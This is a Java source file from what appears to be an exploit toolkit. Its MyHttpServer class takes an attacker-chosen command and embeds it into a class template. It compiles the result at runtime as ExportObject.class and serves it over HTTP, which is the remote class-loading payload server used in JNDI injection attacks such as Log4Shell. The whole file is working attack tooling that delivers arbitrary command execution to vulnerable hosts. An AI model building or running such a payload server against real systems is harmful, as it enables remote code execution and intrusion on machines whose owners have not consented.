package gds.els.main;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;

import org.apache.commons.io.IOUtils;

import com.sun.net.httpserver.HttpServer;

public class MyHttpServer {

	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
			
	public static void run(InetAddress host, int port, String command) {

		try (InputStream inputStream = MyHttpServer.class.getClassLoader().getResourceAsStream("ExportObject.template") )
		{
			if (null == inputStream || inputStream.available() < 0) {
				System.out.println("[-] ExportObject.template not found");
				System.out.println("[-] HTTP server not running");
				System.exit(1);
			}

			// create ExportObject.java file
			File temp = new File(TEMP_DIR + File.separator + "ExportObject.java");
			try (PrintWriter out = new PrintWriter(temp) ) {
				System.out.println("[+] creating file " + temp.getName() + " with embedded command: " + command);
				String str = IOUtils.toString(inputStream, StandardCharsets.UTF_8);
				String res = str.replace("<COMMAND>", command.replace("\"", "\\\""));
				out.write(res);
			}

			// compile at runtime
	        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
	        if (null == compiler) {
				System.out.println("[-] JavaCompiler is null - use JDK instead of JRE");
				System.exit(2);
	        }
	        if (0 != compiler.run(null, null, null, temp.getAbsolutePath())) {
				System.out.println("[-] JavaCompiler failed");
				System.exit(3);
	        }
	        File res = temp.toPath().getParent().resolve("ExportObject.class").toFile();
			System.out.println("[+] compiled file " + res.getName());
	        
		} catch (IOException e) {
			System.out.println("[-] Exception: " + e.getMessage());
			e.printStackTrace();
			System.exit(4);
		} 
		
		// launch http server
		try {
			HttpServer httpServer = HttpServer.create(new InetSocketAddress(host, port), 0);
			httpServer.createContext("/ExportObject.class", new HttpFileHandler());
			httpServer.setExecutor(null);
			httpServer.start();
			System.out.println("[+] HTTP server listening on " + host.getHostAddress() + ":" + port);
		} catch (IOException e) {
			System.out.println("[-] Exception: " + e.getMessage());
			e.printStackTrace();
			System.out.println(5);
		}

	}

}
